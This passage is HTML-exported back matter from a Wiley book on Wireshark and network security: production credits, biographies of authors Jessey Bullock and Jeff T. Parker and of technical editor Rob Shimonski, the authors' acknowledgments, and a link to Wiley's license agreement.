style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Mary Beth Wakefield </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Marketing Manager </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Carrie Sherrill</span><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:0.1000pt;margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Professional Technology and Strategy Director</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:7.7000pt;margin-right:311.2500pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Barry Pruett </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Business Manager </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Amy Knies </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Executive Editor </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Jim Minatel</span><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:0.2000pt;margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Project Coordinator, Cover</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Brent Savage</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Proofreader</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section384" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Nancy Bell</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Indexer</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:7.7000pt;margin-right:334.0500pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Nancy Guenther </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Cover Designer </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Wiley</span><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:0.1000pt;margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Cover Image</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#169; Jonathan Haste/iStockPhoto</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section385" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >About the Authors</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.5500pt;" ><a name="_bookmark677" ></a><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Jessey Bullock </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is a security engineer with a diverse background, having worked both as a security consultant and as an internal security team member. Jessey started out supporting network administration while trying to break into the security industry, and Wireshark has always been an integral part of his tool set. His varied skill set was honed across numerous industries, such as energy and finance, even having worked for a gaming company.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Jessey&#8217;s experience includes a deep understanding of offensive and application security. As a consultant, Jessey performed engagements involving everything from incident response to embedded device testing. Jessey currently focuses on application security and has a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >keen interest in scaling security testing while providing day to day security support for developers and performing assessments of internally developed</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >products.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In his free time, Jessey enjoys gaming with his son, writing the occasional Python code, and playing grumpy sysadmin for his</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >wife&#8217;s restaurant</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >business.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Jeff T. Parker </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is a seasoned security professional and technical writer. His 20 years of experience began with Digital Equipment Corporation, then on to Compaq and Hewlett Packard, where Jeff primarily consulted on complex enterprise environments. During the HP years, Jeff shifted his focus from systems to security. Only IT security has matched an insatiable appetite for learning and sharing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Having done the &#8220;get as many certifications as you can&#8221; phase, Jeff is most proud of his service to clients, including UN agencies, government services, and enterprise corporations.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Jeff holds degrees in subjects far from IT, yet he only makes time to hack away at his home lab. He and his family enjoy life in Halifax, Nova Scotia, Canada.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Most excitedly, Jeff timed this project&#8217;s end with a much-anticipated</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section386" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >new project: house training a new puppy.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section387" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >About the Technical Editor</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.5500pt;margin-right:11.1500pt;" ><a name="_bookmark678" ></a><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Rob Shimonski </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(</span><span><a href="http://www.shimonski.com/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >www.shimonski.com</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) is a best-selling author and editor with more than 20 years of experience developing, producing, and distributing print media in the form of books, magazines, and periodicals, and more than 25 years working in the Information Technology field. To date, Rob has successfully helped create, as both an author and an editor, more than 100 books that are currently in circulation. Rob has an extremely diverse background in the print media industry, filling roles such as author, co-author, technical editor, copy editor, and developmental editor. Rob has worked for countless companies, including CompTIA, Cisco, Microsoft, Wiley, McGraw Hill Education, Pearson, the National Security Agency, and the US military.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As a Wireshark guru, Rob&#8217;s experience goes back to the beginning of the application&#8217;s existence. Having worked with Ethereal and various other packet capturing tools, Rob has been at the forefront of</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >watching Wireshark evolve into the outstanding tool it is today. Rob has also captured this evolution in various written works, including </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Sniffer Pro: Network Optimization and Troubleshooting Handbook </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(Syngress, 2002) and </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >The Wireshark Field Guide: Analyzing and Troubleshooting Network Traffic </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(Syngress, 2013). Rob has also worked with INE.com to create a practitioner and advanced practitioner video series detailing the usage and how to work with Wireshark in 2015. In 2016, Rob focused his energies on helping other authors develop their works to ensure technical accuracy in advanced topics within the Wireshark toolset. Rob is also certified as both a Wireshark Certified Network Analyst (WCNA) and a Sniffer Pro</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >SCP.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section388" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >Acknowledgments</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.5500pt;margin-right:11.1500pt;" ><a name="_bookmark679" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This book owes a big thank you to the awesome developers of the Wireshark suite, as well as the developers of Metasploit, Lua, Docker, Python, and all the other open-source developers who make amazing technology accessible. Thanks also to the people at Wiley for putting up with me, especially John Sleeva and Jim Minatel, and to Rob Shimonski, the fantastic technical editor who helped keep the book correct and useful. Special thanks go to my co-author Jeff Parker for taking on the challenge of writing this book. He was a blast to work with and is owed immense credit for helping make this book possible.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >I would also like to thank Jan Kadijk, John Heasman, Jeremy Powell, Tony Cargile, Adam Matthews, Shaun Jones, and Connor Kennedy for contributing ideas and support.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:19.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >&#8212;Jessey</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Kudos to the Wiley team, including Jim Minatel, John Sleeva, and Kim Heusel, for their dedication to carry this book to the finish line. Big thanks to Rob Shimonski, the technical editor, who performed with great patience to ensure we left no gaps or confusion.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To Jessey, the book&#8217;s visionary and the W4SP Lab guru, I thank you for being ever gracious and collaborative. All your effort concludes with a book and online resources that we can both be proud of.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.6000pt;margin-right:33.1000pt;text-align:justify;text-justify:inter-ideograph;" ><a name="_bookmark680" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To Carole Jelen, my literary agent in sunny southern California, all opportunities start with you. You are an endless provider of</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >growth and have my deep gratitude. Thanks,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Carole!</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The biggest thanks go to my wife and my best friend. I&#8217;m grateful for her patience and support. To our two kids, Dad is back and ready to play (and research for the next book&#8212;wink, wink).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:19.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >&#8212;Jeff</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section389" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="End User License Agreement" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark681" ></a>WILEY END USER LICENSE AGREEMENT</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Go to </span><span><a href="http://www.wiley.com/go/eula" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >www.wiley.com/go/eula</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to access Wiley&#8217;s ebook EULA.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div><!--EndFragment--></body></html>